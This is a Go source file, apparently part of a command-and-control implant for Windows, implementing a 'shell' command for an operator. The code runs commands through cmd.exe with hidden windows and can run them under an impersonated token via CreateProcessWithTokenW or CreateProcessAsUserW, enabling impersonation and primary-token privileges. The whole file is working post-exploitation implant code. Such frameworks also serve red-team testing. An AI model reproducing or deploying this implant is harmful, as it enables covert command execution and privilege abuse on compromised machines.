// server/docker/payloads/Windows/action_shell_windows.go
//go:build windows
// +build windows

package main

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

type ShellCommand struct{}

func (c *ShellCommand) Name() string {
	return "shell"
}

func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Output: `Error: No command specified
Usage: 
  shell [--timeout <seconds>] <command> [arguments...]

Examples:
  shell whoami
  shell dir C:\
  shell dir "C:\Program Files"
  shell netstat -an
  shell --timeout 5 ping 8.8.8.8

Note: Commands execute with the current impersonated token if active`,
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Default timeout
	timeout := 30 * time.Second
	commandArgs := args

	// Parse flags
	i := 0
	for i < len(args) {
		switch args[i] {
		case "--timeout":
			if i+1 >= len(args) {
				return CommandResult{
					Output:      "Error: --timeout requires a value",
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}

			timeoutSeconds, err := strconv.Atoi(args[i+1])
			if err != nil || timeoutSeconds <= 0 {
				return CommandResult{
					Output:      fmt.Sprintf("Error: Invalid timeout value '%s'", args[i+1]),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
			timeout = time.Duration(timeoutSeconds) * time.Second
			i += 2

		default:
			commandArgs = args[i:]
			i = len(args) // Break the loop
		}
	}

	if len(commandArgs) == 0 {
		return CommandResult{
			Output:      "Error: No command specified after flags",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Special handling for dir command with paths ending in backslash
	var commandStr string
	if len(commandArgs) >= 2 && strings.ToLower(commandArgs[0]) == "dir" {
		// Check if we have a path argument that ends with backslash
		path := commandArgs[1]
		if strings.HasSuffix(path, "\\") {
			// For paths ending in \, we need to add a dot to make it work
			commandArgs[1] = path + "."
		}
		commandStr = strings.Join(commandArgs, " ")
	} else {
		// For all other commands, just join normally
		commandStr = strings.Join(commandArgs, " ")
	}

	// Get working directory
	ctx.mu.RLock()
	workingDir := ctx.WorkingDir
	ctx.mu.RUnlock()

	// Build output header
	var output strings.Builder
	output.WriteString(fmt.Sprintf("[*] Executing: %s\n", strings.Join(args, " "))) // Show original command
	output.WriteString(fmt.Sprintf("[*] Working Directory: %s\n", workingDir))
	output.WriteString(fmt.Sprintf("[*] Timeout: %v\n", timeout))

	// Check if we have an active token
	hasToken, tokenName := CheckTokenContext(ctx)

	if hasToken {
		output.WriteString(fmt.Sprintf("[*] Using Token: %s\n", tokenName))
		// Get the token for process creation
		token, gotToken := GetTokenForExecution(ctx)
		if gotToken {
			defer CleanupToken(token)
			output.WriteString(strings.Repeat("-", 50) + "\n")
			return c.executeWithToken(commandStr, workingDir, timeout, &output, token) // CHANGED: Pass by pointer
		} else {
			output.WriteString("[!] Failed to get token for execution, falling back to normal execution\n")
		}
	}

	output.WriteString("[*] Shell: cmd.exe (no impersonation)\n")
	output.WriteString(strings.Repeat("-", 50) + "\n")
	return c.executeNormal(commandStr, workingDir, timeout, &output) // CHANGED: Pass by pointer
}

// executeWithToken executes a command using the provided token
func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, timeout time.Duration, output *strings.Builder, token syscall.Token) CommandResult {
	// Try to enable required privileges
	EnablePrivilege("SeImpersonatePrivilege")

	// Prepare command line
	cmdLine := fmt.Sprintf("cmd.exe /c %s", commandStr)
	cmdLineUTF16, err := syscall.UTF16PtrFromString(cmdLine)
	if err != nil {
		output.WriteString(fmt.Sprintf("[!] Failed to convert command: %v\n", err))
		return CommandResult{
			Output:      output.String(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Convert working directory
	var workDirPtr *uint16
	if workingDir != "" {
		workDirPtr, err = syscall.UTF16PtrFromString(workingDir)
		if err != nil {
			output.WriteString(fmt.Sprintf("[!] Failed to convert working directory: %v\n", err))
			return CommandResult{
				Output:      output.String(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
	}

	// Create pipes for stdout/stderr capture
	var stdoutRead, stdoutWrite, stderrRead, stderrWrite syscall.Handle
	sa := syscall.SecurityAttributes{
		Length:        uint32(unsafe.Sizeof(syscall.SecurityAttributes{})),
		InheritHandle: 1,
	}

	err = syscall.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0)
	if err != nil {
		output.WriteString(fmt.Sprintf("[!] Failed to create stdout pipe: %v\n", err))
		return CommandResult{
			Output:      output.String(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer syscall.CloseHandle(stdoutRead)
	defer syscall.CloseHandle(stdoutWrite)

	err = syscall.CreatePipe(&stderrRead, &stderrWrite, &sa, 0)
	if err != nil {
		output.WriteString(fmt.Sprintf("[!] Failed to create stderr pipe: %v\n", err))
		return CommandResult{
			Output:      output.String(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer syscall.CloseHandle(stderrRead)
	defer syscall.CloseHandle(stderrWrite)

	// Set up STARTUPINFO
	si := STARTUPINFO{
		Cb:         uint32(unsafe.Sizeof(STARTUPINFO{})),
		Flags:      STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES,
		ShowWindow: SW_HIDE,
		StdOutput:  stdoutWrite,
		StdError:   stderrWrite,
	}

	var pi PROCESS_INFORMATION

	// Try CreateProcessWithTokenW first (requires less privileges)
	startTime := time.Now()
	ret, _, lastErr := procCreateProcessWithTokenW.Call(
		uintptr(token),
		0, // dwLogonFlags (0 = default)
		0, // lpApplicationName (null = use command line)
		uintptr(unsafe.Pointer(cmdLineUTF16)),
		uintptr(CREATE_NO_WINDOW),
		0, // lpEnvironment (null = inherit)
		uintptr(unsafe.Pointer(workDirPtr)),
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if ret == 0 {
		// If CreateProcessWithTokenW fails, try CreateProcessAsUserW as fallback
		output.WriteString(fmt.Sprintf("[!] CreateProcessWithTokenW failed: %v\n", lastErr))
		output.WriteString("[*] Attempting CreateProcessAsUserW as fallback...\n")

		// Try to enable additional privileges for CreateProcessAsUser
		EnablePrivilege("SeAssignPrimaryTokenPrivilege")
		EnablePrivilege("SeIncreaseQuotaPrivilege")

		ret, _, lastErr = procCreateProcessAsUserW.Call(
			uintptr(token),
			0, // lpApplicationName (null = use command line)
			uintptr(unsafe.Pointer(cmdLineUTF16)),
			0, // lpProcessAttributes
			0, // lpThreadAttributes
			1, // bInheritHandles = TRUE
			uintptr(CREATE_NO_WINDOW),
			0, // lpEnvironment (null = inherit)
			uintptr(unsafe.Pointer(workDirPtr)),
			uintptr(unsafe.Pointer(&si)),
			uintptr(unsafe.Pointer(&pi)),
		)

		if ret == 0 {
			output.WriteString(fmt.Sprintf("[!] CreateProcessAsUserW also failed: %v\n", lastErr))
			output.WriteString("[!] Unable to execute with token\n")
			return CommandResult{
				Output:      output.String(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
	}

	// Close write ends of pipes
	syscall.CloseHandle(stdoutWrite)
	syscall.CloseHandle(stderrWrite)

	// Set up timeout
	timeoutMs := uint32(timeout.Milliseconds())
	if timeout == 0 {
		timeoutMs = syscall.INFINITE
	}

	// Wait for process to complete or timeout
	event, _ := WaitForSingleObject(pi.Process, timeoutMs)
	executionTime := time.Since(startTime)

	// Read output from pipes
	stdoutBuf := make([]byte, 4096)
	stderrBuf := make([]byte, 4096)

	var stdoutData, stderrData []byte
	for {
		var read uint32
		err := syscall.ReadFile(stdoutRead, stdoutBuf, &read, nil)
		if err != nil || read == 0 {
			break
		}
		stdoutData = append(stdoutData, stdoutBuf[:read]...)
	}

	for {
		var read uint32
		err := syscall.ReadFile(stderrRead, stderrBuf, &read, nil)
		if err != nil || read == 0 {
			break
		}
		stderrData = append(stderrData, stderrBuf[:read]...)
	}

	// Add output to result
	if len(stdoutData) > 0 {
		output.WriteString(string(stdoutData))
	}

	if len(stderrData) > 0 {
		if len(stdoutData) > 0 {
			output.WriteString("\n")
		}
		output.WriteString("[STDERR]\n")
		output.WriteString(string(stderrData))
	}

	// Add execution time
	output.WriteString(fmt.Sprintf("\n%s\n", strings.Repeat("-", 50)))
	output.WriteString(fmt.Sprintf("[*] Execution time: %v\n", executionTime.Round(time.Millisecond)))

	// Handle timeout
	if event == syscall.WAIT_TIMEOUT {
		TerminateProcess(pi.Process, 124)
		output.WriteString(fmt.Sprintf("[!] Command timed out after %v\n", timeout))
		CloseHandle(pi.Process)
		CloseHandle(pi.Thread)
		return CommandResult{
			Output:      output.String(),
			ExitCode:    124,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Get exit code
	var exitCode uint32
	GetExitCodeProcess(pi.Process, &exitCode)

	// Clean up handles
	CloseHandle(pi.Process)
	CloseHandle(pi.Thread)

	if exitCode != 0 {
		output.WriteString(fmt.Sprintf("[!] Command exited with code: %d\n", exitCode))
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    int(exitCode),
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// executeNormal executes a command normally without token impersonation
func (c *ShellCommand) executeNormal(commandStr string, workingDir string, timeout time.Duration, output *strings.Builder) CommandResult {
	// Create command with context for timeout
	execContext, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	// Use cmd.exe
	cmd := exec.CommandContext(execContext, "cmd.exe", "/c", commandStr)

	// Hide the console window on Windows
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_NO_WINDOW,
	}

	// Set working directory
	cmd.Dir = workingDir

	// Capture output
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Execute the command
	startTime := time.Now()
	err := cmd.Run()
	executionTime := time.Since(startTime)

	// Add stdout to output
	if stdout.Len() > 0 {
		output.WriteString(stdout.String())
	}

	// Add stderr if present
	if stderr.Len() > 0 {
		if stdout.Len() > 0 {
			output.WriteString("\n")
		}
		output.WriteString("[STDERR]\n")
		output.WriteString(stderr.String())
	}

	// Add execution time
	output.WriteString(fmt.Sprintf("\n%s\n", strings.Repeat("-", 50)))
	output.WriteString(fmt.Sprintf("[*] Execution time: %v\n", executionTime.Round(time.Millisecond)))

	// Handle errors
	if err != nil {
		// Check if it was a timeout
		if execContext.Err() == context.DeadlineExceeded {
			output.WriteString(fmt.Sprintf("[!] Command timed out after %v\n", timeout))
			return CommandResult{
				Output:      output.String(),
				ExitCode:    124,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Get exit code if available
		exitCode := 1
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		}

		// Add error info if no output was captured
		if stdout.Len() == 0 && stderr.Len() == 0 {
			output.WriteString(fmt.Sprintf("[!] Command failed: %v\n", err))
		} else {
			output.WriteString(fmt.Sprintf("[!] Command exited with code: %d\n", exitCode))
		}

		return CommandResult{
			Output:      output.String(),
			ExitCode:    exitCode,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
